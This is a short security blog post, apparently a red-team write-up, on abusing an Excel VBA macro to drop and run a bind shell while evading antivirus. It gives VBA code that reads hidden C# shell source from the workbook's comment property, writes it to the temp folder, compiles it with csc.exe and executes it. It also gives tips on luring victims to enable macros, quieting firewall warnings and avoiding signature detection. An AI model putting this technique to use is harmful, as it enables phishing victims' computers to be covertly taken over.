# InfoSec_chronicles from Noobland
## Abuse Excel VBA macro
###### 21/07/20 ver 1.0
In this article I will illustrate how to execute a payload loaded from a VBA macro script embedded in an Excel xlsm file.<br>
The requirement was to bypass a note AV software installed on a client machine. Following the events:
* A mail with the Excel file was sent to the client, here I play the role of the victim<br>
![Screenshot](screen/mail.png)
* The mail was not marked as Spam, the user eventually can open directly the enclosed file using the corresponding Outlook feature or download to a local folder
* Once the file has been opened of course a warning appears about the macro content. Here it is necessary to lure the user to enable the macro<br>
![Screenshot](screen/macro.png)
* If the macro is enabled the VBA script will *compile a payload*, in this case a bind shell and execute it. Here the MS firewall warn the user since I used a not common port (4444), using a port like 80 did not rise any warning<br>
![Screenshot](screen/fwarn.png)
* The bind shell is executed (a shell window will popup, you need of course to hide it), the AV will sandbox the exe file but actually the shell is executed<br/>
![Screenshot](screen/run.png)
###### *The logic*
* I embedded the source code of the bind shell in the comment property of the Excel file Here the link to the MS doc: https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.tools.excel.workbook.builtindocumentproperties?view=vsto-2017 and I retrived the value in the VBA script as follows:<br>
`var = ActiveWorkbook.BuiltinDocumentProperties(5)`<br>
I used a file system object to write the source code of the shell to the *user temp folder*
```
    Dim path As String
    path = Environ("Temp")
    Dim FSO As Object
    Set FSO = CreateObject("Scripting.FileSystemObject")
    Dim oFile As Object
    Set oFile = FSO.CreateTextFile(path & "\mal.cs")
```
* Then I write the content to the file
```   
   oFile.Write var
   oFile.Close
```
* I used the same technique to get the port, that is parametric, and to initialize the wscript shell object<br>
![Screenshot](screen/propxlsm.png)
```
    Dim wSo as Object
    shellObj = ActiveWorkbook.BuiltinDocumentProperties(4)
    wSo = CreateObject(shellObj)
```
* Now we need to find a compiler on the system, I searched for the *csc.exe* since the .Net FW is installed almost on every newer Win OS and my payload is written in C#. Assuming that the full path of csc.exe is stored in the CSC variable the following will compile the source file:
```
    Dim exePath As String
    exePath = """" & path & "\mal.exe" & """"
    wSo.exec CSC & " /t:exe /out:" & exePath & " " & csPath
```
* Finally I executed the bind shell
```
wSo.exec path & "\mal.exe"
```
###### *Conclusion*
The idea is to compile a payload on the victim machine in order to avoid to downlad it from somewhere since the corresponding code will rise alerts on AV software, same thing happens trying to run a cmd or a bat file. Not talk about powershell. Of course you have to avoid to embedd well-known code or created with msfvenom since they will be detected once compiled. Be creative and code your stuff.<br>Here you can download the Excel file and the source code of the bind shell, the file is encrypted and you need a password to open it, if you are good guy ;) you can drop me an email at **filobers[at]protonmail[dot]com** and I will happy to provide it<br>

@salut
